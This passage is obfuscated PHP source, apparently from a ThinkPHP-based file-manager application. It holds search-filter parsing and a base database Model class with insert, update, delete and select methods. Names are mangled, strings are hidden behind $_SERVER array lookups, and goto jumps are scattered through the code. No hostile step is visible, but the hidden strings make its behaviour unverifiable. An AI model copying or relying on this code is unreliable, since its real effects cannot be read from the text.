$İØƒªù = str_replace(array($»ø›œéÀ[229], $»ø›œéÀ[50], $»ø›œéÀ[2004]), $»ø›œéÀ[33], $İØƒªù); $İØƒªù = $»ø›œéÀ[430] . str_replace($»ø›œéÀ[47], $»ø›œéÀ[431], $İØƒªù); $Èä©ı— = $êæ—ËŒ•[$»ø›œéÀ[28]]; unset($êæ—ËŒ•[$»ø›œéÀ[28]]); foreach ($êæ—ËŒ• as $´ê¿õú‰ => $ÎÍíÖ¨Û) { $­¿úÑ’–[$»ø›œéÀ[430] . $´ê¿õú‰] = $ÎÍíÖ¨Û; } foreach ($Èä©ı— as $õñÁ¥á–) { $­¿úÑ’–[] = array($»ø›œéÀ[435] => $õñÁ¥á–, $»ø›œéÀ[996] => $»ø›œéÀ[1844], array($»ø›œéÀ[2005] => $õñÁ¥á–, $»ø›œéÀ[2006] => array($»ø›œéÀ[7], array($»ø›œéÀ[458], $»ø›œéÀ[457])))); } $this->join($ºƒŒë×Ñ); $êæ—ËŒ• = $­¿úÑ’–; } private function _parseSearchWhere($şª¿½ª“) { $€œ‹Ì• =& $_SERVER[¥ÙÌÜ¾ê]; $ìÊè = array(); if (isset($şª¿½ª“[$€œ‹Ì•[754]]) && $şª¿½ª“[$€œ‹Ì•[754]]) { $ìÊè[$€œ‹Ì•[84]] = array($€œ‹Ì•[2007], $şª¿½ª“[$€œ‹Ì•[754]]); } if (isset($şª¿½ª“[$€œ‹Ì•[490]]) && $şª¿½ª“[$€œ‹Ì•[490]]) { $»£ÉƒÖı = array($€œ‹Ì•[2008], $şª¿½ª“[$€œ‹Ì•[490]]); if ($ìÊè[$€œ‹Ì•[84]]) { $ìÊè[$€œ‹Ì•[84]] = array($ìÊè[$€œ‹Ì•[84]], $»£ÉƒÖı, $€œ‹Ì•[2009]); } else { $ìÊè[$€œ‹Ì•[84]] = $»£ÉƒÖı; } } if (isset($şª¿½ª“[$€œ‹Ì•[2001]]) && $şª¿½ª“[$€œ‹Ì•[2001]] > 0) { $ìÊè[$€œ‹Ì•[78]] = array($€œ‹Ì•[2007], $şª¿½ª“[$€œ‹Ì•[2001]]); } if (isset($şª¿½ª“[$€œ‹Ì•[2002]]) && $şª¿½ª“[$€œ‹Ì•[2002]]) { $»£ÉƒÖı = array($€œ‹Ì•[2008], $şª¿½ª“[$€œ‹Ì•[2002]]); if ($ìÊè[$€œ‹Ì•[78]]) { $ìÊè[$€œ‹Ì•[78]] = array($ìÊè[$€œ‹Ì•[78]], $»£ÉƒÖı, $€œ‹Ì•[2009]); } else { $ìÊè[$€œ‹Ì•[78]] = $»£ÉƒÖı; } } if (isset($şª¿½ª“[$€œ‹Ì•[588]]) && $şª¿½ª“[$€œ‹Ì•[588]]) { $ìÊè[] = array($€œ‹Ì•[448] => $şª¿½ª“[$€œ‹Ì•[588]], $€œ‹Ì•[446] => $şª¿½ª“[$€œ‹Ì•[588]], $€œ‹Ì•[996] => $€œ‹Ì•[1844]); } if (isset($şª¿½ª“[$€œ‹Ì•[407]]) && $şª¿½ª“[$€œ‹Ì•[407]]) { $¥æ·ÉÒÜ = $şª¿½ª“[$€œ‹Ì•[407]]; if ($¥æ·ÉÒÜ == $€œ‹Ì•[77]) { $ìÊè[$€œ‹Ì•[405]] = 1; } else { if ($¥æ·ÉÒÜ == $€œ‹Ì•[2010]) { $ìÊè[$€œ‹Ì•[405]] = 0; } else { if ($¥æ·ÉÒÜ) { $¥æ·ÉÒÜ = is_array($¥æ·ÉÒÜ) ? $¥æ·ÉÒÜ : explode($€œ‹Ì•[47], $¥æ·ÉÒÜ); $ìÊè[$€œ‹Ì•[407]] = array($€œ‹Ì•[413], $¥æ·ÉÒÜ); $ìÊè[$€œ‹Ì•[405]] = 0; } } } } $this->_parseSearchParent($şª¿½ª“, $ìÊè); if (isset($şª¿½ª“[$€œ‹Ì•[1840]]) && trim($şª¿½ª“[$€œ‹Ì•[1840]])) { $§¶»æñÉ = trim($şª¿½ª“[$€œ‹Ì•[1840]]); $ˆ±ú†¶À = explode($€œ‹Ì•[50], $§¶»æñÉ); if (strlen($§¶»æñÉ) > 2 && (substr($§¶»æñÉ, 0, 1) == $€œ‹Ì•[116] && substr($§¶»æñÉ, -1) == $€œ‹Ì•[116]) || substr($§¶»æñÉ, 0, 1) == $€œ‹Ì•[55] && substr($§¶»æñÉ, -1) == $€œ‹Ì•[55]) { $§¶»æñÉ = substr($§¶»æñÉ, 1, -1); $ˆ±ú†¶À = array($§¶»æñÉ); } $ìÊè[$€œ‹Ì•[28]] = array(array($€œ‹Ì•[538], $€œ‹Ì•[1842] . $§¶»æñÉ . $€œ‹Ì•[1842])); if (count($ˆ±ú†¶À) > 1) { $ìÊè[$€œ‹Ì•[28]] = array(); foreach ($ˆ±ú†¶À as $ï‹³‡Á”) { if (!trim($ï‹³‡Á”)) { continue; } $ìÊè[$€œ‹Ì•[28]][] = array($€œ‹Ì•[538], $€œ‹Ì•[1842] . trim($ï‹³‡Á”) . $€œ‹Ì•[1842]); } } } return $ìÊè; } private function _parseSearchParent($Ô¾ç™Ôä, &$•¥å“Ïˆ) { $¶³é”¥ =& $_SERVER[¥ÙÌÜ¾ê]; if (!isset($Ô¾ç™Ôä[$¶³é”¥[492]]) || !$Ô¾ç™Ôä[$¶³é”¥[492]]) { return; } $‡’Â‘Ú = $this->pathInfo($Ô¾ç™Ôä[$¶³é”¥[492]]); $Í›áé›Ã = $‡’Â‘Ú[$¶³é”¥[492]] . $¶³é”¥[33] === $¶³é”¥[191]; $ıÛÈÎé = $‡’Â‘Ú[$¶³é”¥[406]] == $¶³é”¥[509]; $•¥å“Ïˆ[$¶³é”¥[578]] = array($¶³é”¥[538], $‡’Â‘Ú[$¶³é”¥[515]] . $Ô¾ç™Ôä[$¶³é”¥[492]] . $¶³é”¥[539]); $—éıÉ¹ø = isset($Ô¾ç™Ôä[$¶³é”¥[1707]]) && in_array($¶³é”¥[509], $Ô¾ç™Ôä[$¶³é”¥[1707]]); if (!$—éıÉ¹ø || !$ıÛÈÎé || !$Í›áé›Ã || !$‡’Â‘Ú[$¶³é”¥[408]]) { return; } if (!AuthModel::authCheckRoot($‡’Â‘Ú[$¶³é”¥[408]][$¶³é”¥[409]])) { return; } $¶éîè¯— = $‡’Â‘Ú[$¶³é”¥[498]] . $¶³é”¥[33]; if ($¶éîè¯— == $¶³é”¥[87]) { unset($•¥å“Ïˆ[$¶³é”¥[578]]); $•¥å“Ïˆ[$¶³é”¥[406]] = self::TYPE_GROUP; return; } $òéš´ÕÅ = Model($¶³é”¥[516])->groupChildrenAll($¶éîè¯—); $Í£¡×˜Ê = count($òéš´ÕÅ); if ($Í£¡×˜Ê <= 1) { return; } $‹³¾ğšÕ = array($¶³é”¥[492] => 0, $¶³é”¥[406] => self::TYPE_GROUP, $¶³é”¥[498] => array($¶³é”¥[7], $òéš´ÕÅ)); $Ï˜—şóŞ = $this->field($¶³é”¥[2011])->where($‹³¾ğšÕ)->limit($Í£¡×˜Ê)->select(); $•¥å“Ïˆ[$¶³é”¥[578]] = array(); foreach ($Ï˜—şóŞ as $ÍÎº¤‡™) { $•¥å“Ïˆ[$¶³é”¥[578]][] = array($¶³é”¥[538], $¶³é”¥[525] . $ÍÎº¤‡™[$¶³é”¥[397]] . $¶³é”¥[539]); } $•¥å“Ïˆ[$¶³é”¥[578]][] = $¶³é”¥[1844]; } } goto d´áñ™Æ©“; d˜ğ¢š¿ß¿: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\145", "\157\162\x64\145\162", "\x61\x6c\x69\x61\163", "\150\141\x76\x69\156\x67", "\x67\x72\x6f\x75\x70", "\x6c\157\x63\153", "\x64\151\163\x74\151\x6e\x63\x74", "\141\x75\x74\x6f", "\146\x69\x6c\x74\x65\x72", "\166\141\x6c\151\x64\x61\x74\x65", "\x72\x65\x73\165\154\x74", "\142\151\x6e\x64", "\164\157\x6b\x65\x6e"); public function __construct($²Ö˜…¢ê = '', $ÌšËŒ¢² = '', $ı‰œÃº = '') { $”  ÉË =& $_SERVER[¥ÙÌÜ¾ê]; $this->_initialize(); if (!empty($²Ö˜…¢ê)) { if (strpos($²Ö˜…¢ê, $”  ÉË[95])) { list($this->dbName, $this->name) = explode($”  ÉË[95], $²Ö˜…¢ê); } else { $this->name = $²Ö˜…¢ê; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ÌšËŒ¢²)) { $this->tablePrefix = $”  ÉË[33]; } elseif ($”  ÉË[33] != $ÌšËŒ¢²) { $this->tablePrefix = $ÌšËŒ¢²; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($”  ÉË[242]); } $this->db(0, empty($this->connection) ? $ı‰œÃº : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Ç¾ç¿áò =& $_SERVER[¥ÙÌÜ¾ê]; if (empty($this->fields)) { if (think_config($Ç¾ç¿áò[243])) { $ëÌø ­ = $this->dbName ? $this->dbName : think_config($Ç¾ç¿áò[244]); $ªğÄ¶Ï¬ = think_var_cache($Ç¾ç¿áò[245] . strtolower(get_path_this($ëÌø ­) . $Ç¾ç¿áò[95] . $this->name)); if ($ªğÄ¶Ï¬) { $‚­÷œ—ñ = think_config($Ç¾ç¿áò[246]); if (empty($‚­÷œ—ñ) || $ªğÄ¶Ï¬[$Ç¾ç¿áò[247]] == $‚­÷œ—ñ) { $this->fields = $ªğÄ¶Ï¬; return; } } } $this->flush(); } } public function flush() { $¸ˆùÏı =& $_SERVER[¥ÙÌÜ¾ê]; $this->db->setModel($this->name); $ğíÄ‡ï´ = $this->db->getFields($this->getTableName()); if (!$ğíÄ‡ï´) { return !1; } $this->fields = array_keys($ğíÄ‡ï´); $this->fields[$¸ˆùÏı[248]] = !1; foreach ($ğíÄ‡ï´ as $²½‰ıÚË => $Şã÷Ã®) { $Í”öäÎ[$²½‰ıÚË] = $Şã÷Ã®[$¸ˆùÏı[29]]; if ($Şã÷Ã®[$¸ˆùÏı[36]]) { $this->fields[$¸ˆùÏı[249]] = $²½‰ıÚË; if ($Şã÷Ã®[$¸ˆùÏı[39]]) { $this->fields[$¸ˆùÏı[248]] = !0; } } } $this->fields[$¸ˆùÏı[250]] = $Í”öäÎ; if (think_config($¸ˆùÏı[246])) { $this->fields[$¸ˆùÏı[247]] = think_config($¸ˆùÏı[246]); } if (think_config($¸ˆùÏı[243])) { $§ì¯¢–Á = $this->dbName ? $this->dbName : think_config($¸ˆùÏı[244]); think_var_cache($¸ˆùÏı[245] . strtolower(get_path_this($§ì¯¢–Á) . $¸ˆùÏı[95] . $this->name), $this->fields); } } public function switchModel($°õÂ£…¥, $¢ àŒÆ“ = array()) { $²õâî«ä =& $_SERVER[¥ÙÌÜ¾ê]; $ÁŸç¬¨ì = ucwords(strtolower($°õÂ£…¥)) . $²õâî«ä[251]; if (!class_exists($ÁŸç¬¨ì)) { think_exception($ÁŸç¬¨ì . think_lang($²õâî«ä[252])); } $this->_extModel = new $ÁŸç¬¨ì($this->name); if (!empty($¢ àŒÆ“)) { foreach ($¢ àŒÆ“ as $ÅøÄ®Ó) { $this->_extModel->setProperty($ÅøÄ®Ó, $this->{$ÅøÄ®Ó}); } } return $this->_extModel; } public function __set($ıáÔ®³, $ÈÉú†šÀ) { $this->data[$ıáÔ®³] = $ÈÉú†šÀ; } public function __get($ÔËó²ì ) { return isset($this->data[$ÔËó²ì ]) ? $this->data[$ÔËó²ì ] : null; } public function __isset($¸ù—•õç) { return isset($this->data[$¸ù—•õç]); } public function __unset($Õ€å‰¯») { unset($this->data[$Õ€å‰¯»]); } public function __call($åÑæõÂÓ, $—·×·¶) { $«©–ˆÑÏ =& $_SERVER[¥ÙÌÜ¾ê]; if (in_array(strtolower($åÑæõÂÓ), $this->methods, !0)) { $this->options[strtolower($åÑæõÂÓ)] = $—·×·¶[0]; return $this; } elseif (in_array(strtolower($åÑæõÂÓ), array($«©–ˆÑÏ[253], $«©–ˆÑÏ[254], $«©–ˆÑÏ[255], $«©–ˆÑÏ[256], $«©–ˆÑÏ[257]), !0)) { $Ô‘Ü¬§ = isset($—·×·¶[0]) ? $—·×·¶[0] : $«©–ˆÑÏ[182]; $Ô‘Ü¬§ = $this->db->parseKey($Ô‘Ü¬§); return $this->getField(strtoupper($åÑæõÂÓ) . $«©–ˆÑÏ[258] . $Ô‘Ü¬§ . $«©–ˆÑÏ[259] . $åÑæõÂÓ, $«©–ˆÑÏ[253]); } elseif (strtolower(substr($åÑæõÂÓ, 0, 5)) == $«©–ˆÑÏ[260]) { $Ô‘Ü¬§ = think_parse_name(substr($åÑæõÂÓ, 5)); $Ô«àÔ ±[$Ô‘Ü¬§] = $—·×·¶[0]; return $this->where($Ô«àÔ ±)->find(); } elseif (strtolower(substr($åÑæõÂÓ, 0, 10)) == $«©–ˆÑÏ[261]) { $Ãâ’‰¾Ö = think_parse_name(substr($åÑæõÂÓ, 10)); $Ô«àÔ ±[$Ãâ’‰¾Ö] = $—·×·¶[0]; return $this->where($Ô«àÔ ±)->getField($—·×·¶[1]); } elseif (isset($this->_scope[$åÑæõÂÓ])) { return $this->scope($åÑæõÂÓ, $—·×·¶[0]); } elseif (method_exists($this, $åÑæõÂÓ)) { array_unshift($—·×·¶, $åÑæõÂÓ); return call_user_func_array(array($this, $«©–ˆÑÏ[262]), $—·×·¶); } else { return call_user_func_array(array(parent, $åÑæõÂÓ), $—·×·¶); } } protected function call() { $·£½€ŞÀ =& $_SERVER[¥ÙÌÜ¾ê]; $¬¡¾–ğ = func_get_args(); $â›ÜâÙ™ = array_shift($¬¡¾–ğ); $ÔÏŒ¥ß© = $â›ÜâÙ™; if (is_array($â›ÜâÙ™)) { $ÔÏŒ¥ß© = $â›ÜâÙ™[1]; $â›ÜâÙ™ = $â›ÜâÙ™[0]; } $èìõå½ = count($¬¡¾–ğ) - 1; if (isset($¬¡¾–ğ[$èìõå½]) && $¬¡¾–ğ[$èìõå½] === $â›ÜâÙ™) { think_exception(__CLASS__ . $·£½€ŞÀ[4] . $â›ÜâÙ™ . think_lang($·£½€ŞÀ[263])); return; } $¬¡¾–ğ[] = $â›ÜâÙ™; if (method_exists($this, $·£½€ŞÀ[264])) { $–›Æş® = call_user_func_array(array($this, $·£½€ŞÀ[265]), array($ÔÏŒ¥ß©, $¬¡¾–ğ)); if (!is_null($–›Æş®) && $–›Æş® !== !1) { return $–›Æş®; } } $Ğ«ÀÛšÎ = call_user_func_array(array($this, $â›ÜâÙ™), $¬¡¾–ğ); if (method_exists($this, $·£½€ŞÀ[266])) { $–›Æş® = call_user_func_array(array($this, $·£½€ŞÀ[267]), array($ÔÏŒ¥ß©, $¬¡¾–ğ, $Ğ«ÀÛšÎ)); if ($–›Æş®) { return $–›Æş®; } } return $Ğ«ÀÛšÎ; } protected function _initialize() { } protected function _facade($Ø»“³¥) { $‡‹’œ´€ =& $_SERVER[¥ÙÌÜ¾ê]; if (!empty($this->fields)) { foreach ($Ø»“³¥ as $½‘ğ•—— => $‚©£ô¦ç) { if (is_array($this->fields) && !in_array($½‘ğ•——, $this->fields, !0)) { unset($Ø»“³¥[$½‘ğ•——]); } elseif (is_scalar($‚©£ô¦ç)) { $this->_parseType($Ø»“³¥, $½‘ğ•——); } } } if (!empty($this->options[$‡‹’œ´€[268]])) { $Ø»“³¥ = array_map($this->options[$‡‹’œ´€[268]], $Ø»“³¥); unset($this->options[$‡‹’œ´€[268]]); } $this->_beforeWrite($Ø»“³¥); return $Ø»“³¥; } protected function _beforeWrite(&$Ô¬ÙÆÈ) { } public function add($ãÒö— Ë = '', $­¼ƒ„ğ² = array(), $²›ô°‰ù = false) { if (empty($ãÒö— Ë)) { if (!empty($this->data)) { $ãÒö— Ë = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¥ÙÌÜ¾ê][269]); return !1; } } $­¼ƒ„ğ² = $this->_parseOptions($­¼ƒ„ğ²); $ãÒö— Ë = $this->_facade($ãÒö— Ë); if (!1 === $this->_beforeInsert($ãÒö— Ë, $­¼ƒ„ğ²)) { return !1; } $¢—ÈÔ¨õ = $this->db->insert($ãÒö— Ë, $­¼ƒ„ğ², $²›ô°‰ù); if (!1 !== $¢—ÈÔ¨õ) { $ŒÕƒñÎé = $this->getLastInsID(); if ($ŒÕƒñÎé) { $ãÒö— Ë[$this->getPk()] = $ŒÕƒñÎé; $this->_after_insert($ãÒö— Ë, $­¼ƒ„ğ²); return $ŒÕƒñÎé; } $this->_after_insert($ãÒö— Ë, $­¼ƒ„ğ²); } return $¢—ÈÔ¨õ; } protected function _beforeInsert(&$¿§§™Ô’, $ÛÚĞ¹êù) { } protected function _after_insert($´’®—¥, $æ´çÌ½) { } public function addAll($ËÇÀÓÕ™, $÷€·ä¸à = array(), $£¤ÛıÉ† = false) { $Ùù¹“³Ü =& $_SERVER[¥ÙÌÜ¾ê]; if (empty($ËÇÀÓÕ™)) { $this->error = think_lang($Ùù¹“³Ü[269]); return !1; } $÷€·ä¸à = $this->_parseOptions($÷€·ä¸à); foreach ($ËÇÀÓÕ™ as $Øº¤–Œ‰ => $­Î¬š¨®) { $ËÇÀÓÕ™[$Øº¤–Œ‰] = $this->_facade($­Î¬š¨®); } if (method_exists($this->db, $Ùù¹“³Ü[270])) { $²†Íûı• = $this->db->insertAll($ËÇÀÓÕ™, $÷€·ä¸à, $£¤ÛıÉ†); } else { $this->startTrans(); foreach ($ËÇÀÓÕ™ as $Øº¤–Œ‰ => $­Î¬š¨®) { $²†Íûı• = $this->db->insert($­Î¬š¨®, $÷€·ä¸à, $£¤ÛıÉ†); } $this->commit(); } if (!1 !== $²†Íûı•) { $˜ËÁ¾ô = $this->getLastInsID(); if ($˜ËÁ¾ô) { return $˜ËÁ¾ô; } } return $²†Íûı•; } public function selectAdd($¬ØÙ“èû = '', $Õ£šêÜ = '', $ğÂ©áÍ¡ = array()) { $ÌÛ¥ïÑ =& $_SERVER[¥ÙÌÜ¾ê]; $ğÂ©áÍ¡ = $this->_parseOptions($ğÂ©áÍ¡); if (!1 === ($®÷ˆáƒ‹ = $this->db->selectInsert($¬ØÙ“èû ? $¬ØÙ“èû : $ğÂ©áÍ¡[$ÌÛ¥ïÑ[271]], $Õ£šêÜ ? $Õ£šêÜ : $this->getTableName(), $ğÂ©áÍ¡))) { $this->error = think_lang($ÌÛ¥ïÑ[272]); return !1; } else { return $®÷ˆáƒ‹; } } public function save($¿‘Î¡Â‰ = '', $ÕçûƒÖ = array()) { $ÏÁ»Ìûß =& $_SERVER[¥ÙÌÜ¾ê]; if (empty($¿‘Î¡Â‰)) { if (!empty($this->data)) { $¿‘Î¡Â‰ = $this->data; $this->data = array(); } else { $this->error = think_lang($ÏÁ»Ìûß[269]); return !1; } } $¿‘Î¡Â‰ = $this->_facade($¿‘Î¡Â‰); $ÕçûƒÖ = $this->_parseOptions($ÕçûƒÖ); $À¯èæ¥Ä = $this->getPk(); if (!isset($ÕçûƒÖ[$ÏÁ»Ìûß[273]])) { if (isset($¿‘Î¡Â‰[$À¯èæ¥Ä])) { $çô¨äÓß[$À¯èæ¥Ä] = $¿‘Î¡Â‰[$À¯èæ¥Ä]; $ÕçûƒÖ[$ÏÁ»Ìûß[273]] = $çô¨äÓß; unset($¿‘Î¡Â‰[$À¯èæ¥Ä]); } else { $this->error = think_lang($ÏÁ»Ìûß[272]); return !1; } } if (is_array($ÕçûƒÖ[$ÏÁ»Ìûß[273]]) && isset($ÕçûƒÖ[$ÏÁ»Ìûß[273]][$À¯èæ¥Ä])) { $úº¿Òµ = $ÕçûƒÖ[$ÏÁ»Ìûß[273]][$À¯èæ¥Ä]; } if (!1 === $this->_beforeUpdate($¿‘Î¡Â‰, $ÕçûƒÖ)) { return !1; } $½Ô¡²Àü = $this->db->update($¿‘Î¡Â‰, $ÕçûƒÖ); if (!1 !== $½Ô¡²Àü) { if (isset($úº¿Òµ)) { $¿‘Î¡Â‰[$À¯èæ¥Ä] = $úº¿Òµ; } $this->_afterUpdate($¿‘Î¡Â‰, $ÕçûƒÖ); } return $½Ô¡²Àü; } protected function _beforeUpdate(&$Áîë¶­°, $›’üËËÍ) { } protected function _afterUpdate($£êàÃ–¢, $¡Ô“¿ø˜) { } public function delete($¸ˆèÏ’¤ = array()) { $Èßªµä· =& $_SERVER[¥ÙÌÜ¾ê]; if (empty($¸ˆèÏ’¤) && empty($this->options[$Èßªµä·[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ú¢ßĞ = $this->getPk(); if (is_numeric($¸ˆèÏ’¤) || is_string($¸ˆèÏ’¤)) { if (strpos($¸ˆèÏ’¤, $Èßªµä·[47])) { $½ú†¥¸Ü[$ú¢ßĞ] = array($Èßªµä·[274], $¸ˆèÏ’¤); } else { $½ú†¥¸Ü[$ú¢ßĞ] = $¸ˆèÏ’¤; } $this->options[$Èßªµä·[273]] = $½ú†¥¸Ü; } $¸ˆèÏ’¤ = $this->_parseOptions(); if (is_array($¸ˆèÏ’¤[$Èßªµä·[273]]) && isset($¸ˆèÏ’¤[$Èßªµä·[273]][$ú¢ßĞ])) { $¡ƒå“­­ = $¸ˆèÏ’¤[$Èßªµä·[273]][$ú¢ßĞ]; } $ØÏº¡ƒì = $this->db->delete($¸ˆèÏ’¤); if (!1 !== $ØÏº¡ƒì) { $Î°´Ùä¶ = array(); if (isset($¡ƒå“­­)) { $Î°´Ùä¶[$ú¢ßĞ] = $¡ƒå“­­; } $this->_after_delete($Î°´Ùä¶, $¸ˆèÏ’¤); } return $ØÏº¡ƒì; } protected function _after_delete($ÖÂ°˜´İ, $ğ˜îÁ¬Ğ) { } public function select($Å¹¶½•† = array()) { $Ë’º‘ =& $_SERVER[¥ÙÌÜ¾ê]; if (is_string($Å¹¶½•†) || is_numeric($Å¹¶½•†)) { $Ü­ÄƒÇí = $this->getPk(); if (strpos($Å¹¶½•†, $Ë’º‘[47])) { $–½ªçıÕ[$Ü­ÄƒÇí] = array($Ë’º‘[274], $Å¹¶½•†); } else { $–½ªçıÕ[$Ü­ÄƒÇí] = $Å¹¶½•†; } $this->options[$Ë’º‘[273]] = $–½ªçıÕ; } elseif (!1 === $Å¹¶½•†) { $Å¹¶½•† = $this->_parseOptions(); return $Ë’º‘[275] . $this->db->buildSelectSql($Å¹¶½•†) . $Ë’º‘[276]; } $Å¹¶½•† = $this->_parseOptions(); $‹–ßÙ ¼ = $this->db->select($Å¹¶½•†); if (!1 === $‹–ßÙ ¼) { return !1; } if (empty($‹–ßÙ ¼)) { return null; } $this->_afterSelect($‹–ßÙ ¼, $Å¹¶½•†); return $‹–ßÙ ¼; } protected function _afterSelect(&$ˆ”²éÜë, $×ã‚„Ú) { } public function buildSql($”Ş’ÍÓ = array()) { $ö§ÏÑø¯ =& $_SERVER[¥ÙÌÜ¾ê]; $”Ş’ÍÓ = $this->_parseOptions($”Ş’ÍÓ); return $ö§ÏÑø¯[275] . $this->db->buildSelectSql($”Ş’ÍÓ) . $ö§ÏÑø¯[276]; } public function optionsValue($Åê¿ÇÊ¿ = null) { if (is_null($Åê¿ÇÊ¿)) { return $this->options; } elseif (is_array($Åê¿ÇÊ¿)) { $this->options = array_merge($this->options, $Åê¿ÇÊ¿); } } protected function _parseOptions($È§…œ°„ = array()) { $ÖØ±‰Üì =& $_SERVER[¥ÙÌÜ¾ê]; if (is_array($È§…œ°„)) { $È§…œ°„ = array_merge($this->options, $È§…œ°„); } $this->options = array(); if (!isset($È§…œ°„[$ÖØ±‰Üì[277]])) { $È§…œ°„[$ÖØ±‰Üì[277]] = $this->getTableName(); $Û¶ÂôëØ = $this->fields; } else { $Û¶ÂôëØ = $this->getDbFields(); } if (!empty($È§…œ°„[$ÖØ±‰Üì[278]])) { $È§…œ°„[$ÖØ±‰Üì[277]] .= $ÖØ±‰Üì[50] . $È§…œ°„[$ÖØ±‰Üì[278]]; } $È§…œ°„[$ÖØ±‰Üì[279]] = $this->name; if (isset($È§…œ°„[$ÖØ±‰Üì[273]]) && is_array($È§…œ°„[$ÖØ±‰Üì[273]]) && !empty($Û¶ÂôëØ) && !isset($È§…œ°„[$ÖØ±‰Üì[280]]) && !isset($È§…œ°„[$ÖØ±‰Üì[277]])) { foreach ($È§…œ°„[$ÖØ±‰Üì[273]] as $Ï§õÎ => $Î¤´Ô²¬) { $Ï§õÎ = trim($Ï§õÎ); if (in_array($Ï§õÎ, $Û¶ÂôëØ, !0)) { if (is_scalar($Î¤´Ô²¬)) { $this->_parseType($È§…œ°„[$ÖØ±‰Üì[273]], $Ï§õÎ); } } elseif (!is_numeric($Ï§õÎ) && $ÖØ±‰Üì[71] != substr($Ï§õÎ, 0, 1) && !1 === strpos($Ï§õÎ, $ÖØ±‰Üì[95]) && !1 === strpos($Ï§õÎ, $ÖØ±‰Üì[258]) && !1 === strpos($Ï§õÎ, $ÖØ±‰Üì[281]) && !1 === strpos($Ï§õÎ, $ÖØ±‰Üì[282])) { unset($È§…œ°„[$ÖØ±‰Üì[273]][$Ï§õÎ]); } } } $this->_options_filter($È§…œ°„); return $È§…œ°„; } protected function _options_filter(&$˜¤Ç˜®ç) { } protected function _parseType(&$‘™®¨éñ, $ÛÀœªÎ¼) { $¢„¸©ª» =& $_SERVER[¥ÙÌÜ¾ê]; if (empty($this->options[$¢„¸©ª»[283]][$¢„¸©ª»[4] . $ÛÀœªÎ¼])) { $×¹úáäË = strtolower($this->fields[$¢„¸©ª»[250]][$ÛÀœªÎ¼]); if (!1 !== strpos($×¹úáäË, $¢„¸©ª»[284])) { } elseif (!1 === strpos($×¹úáäË, $¢„¸©ª»[285]) && !1 !== strpos($×¹úáäË, $¢„¸©ª»[286])) { $‘™®¨éñ[$ÛÀœªÎ¼] = intval($‘™®¨éñ[$ÛÀœªÎ¼]); } elseif (!1 !== strpos($×¹úáäË, $¢„¸©ª»[287]) || !1 !== strpos($×¹úáäË, $¢„¸©ª»[288])) { $‘™®¨éñ[$ÛÀœªÎ¼] = floatval($‘™®¨éñ[$ÛÀœªÎ¼]); } elseif (!1 !== strpos($×¹úáäË, $¢„¸©ª»[289])) { $‘™®¨éñ[$ÛÀœªÎ¼] = (bool) $‘™®¨éñ[$ÛÀœªÎ¼]; } } } public function find($ÈÃ³¿ƒæ = array()) { $ŠŸå÷’ñ =& $_SERVER[¥ÙÌÜ¾ê]; if (is_numeric($ÈÃ³¿ƒæ) || is_string($ÈÃ³¿ƒæ)) { $»İÖË‰ï[$this->getPk()] = intval($ÈÃ³¿ƒæ); $this->options[$ŠŸå÷’ñ[273]] = $»İÖË‰ï; } $this->options[$ŠŸå÷’ñ[290]] = 1; $ÈÃ³¿ƒæ = $this->_parseOptions(); $¨äÊ‰Ûµ = $this->db->select($ÈÃ³¿ƒæ); if (!1 === $¨äÊ‰Ûµ) { return !1; } if (empty($¨äÊ‰Ûµ)) { return null; } $this->data = $¨äÊ‰Ûµ[0]; $this->_afterFind($this->data, $ÈÃ³¿ƒæ); if (!empty($this->options[$ŠŸå÷’ñ[291]])) { return $this->returnResult($this->data, $this->options[$ŠŸå÷’ñ[291]]); } return $this->data; } protected function _afterFind(&$şèŸºß, $ÖÄ†óûÜ) { } protected function returnResult($–¿‡¬Ì, $™½†ûİ¹ = '') { $‡ñµ¬„ =& $_SERVER[¥ÙÌÜ¾ê]; if ($™½†ûİ¹) { if (is_callable($™½†ûİ¹)) { return call_user_func($™½†ûİ¹, $–¿‡¬Ì); } switch (strtolower($™½†ûİ¹)) { case $‡ñµ¬„[292]: return json_encode($–¿‡¬Ì); case $‡ñµ¬„[293]: return xml_encode($–¿‡¬Ì); } } return $–¿‡¬Ì; } public function parseFieldsMap($üğ¤ª©¢, $¯˜âğ‰Ç = 1) { if (!empty($this->_map)) { foreach ($this->_map as $şù”ˆî‘ => $›Ì†¡Ñ) { if ($¯˜âğ‰Ç == 1) { if (isset($üğ¤ª©¢[$›Ì†¡Ñ])) { $üğ¤ª©¢[$şù”ˆî‘] = $üğ¤ª©¢[$›Ì†¡Ñ]; unset($üğ¤ª©¢[$›Ì†¡Ñ]); } } else { if (isset($üğ¤ª©¢[$şù”ˆî‘])) { $üğ¤ª©¢[$›Ì†¡Ñ] = $üğ¤ª©¢[$şù”ˆî‘]; unset($üğ¤ª©¢[$şù”ˆî‘]); } } } } return $üğ¤ª©¢; } public function setField($‰¯à’÷£, $Àæ´²Ä = '') { if (is_array($‰¯à’÷£)) { $¹³¸Î¡õ = $‰¯à’÷£; } else { $¹³¸Î¡õ[$‰¯à’÷£] = $Àæ´²Ä; } return $this->save($¹³¸Î¡õ); } public function setAdd($‡Î”È, $¸ğ›ñÏé = 1) { $ñÈÁÃ¨Ú =& $_SERVER[¥ÙÌÜ¾ê]; $£õÀ§Ôì = $‡Î”È . $ñÈÁÃ¨Ú[294] . $¸ğ›ñÏé; if ($¸ğ›ñÏé < 0) { $£õÀ§Ôì = $‡Î”È . $¸ğ›ñÏé; } return $this->setField($‡Î”È, array($ñÈÁÃ¨Ú[295], $£õÀ§Ôì)); } public function getField($ ¢Ä¦í, $ÚæÙ§éŞ = null) { $úÓ¹ûÆ¿ =& $_SERVER[¥ÙÌÜ¾ê]; $ÊÙúğÑì[$úÓ¹ûÆ¿[271]] = $ ¢Ä¦í; $ÊÙúğÑì = $this->_parseOptions($ÊÙúğÑì); $ 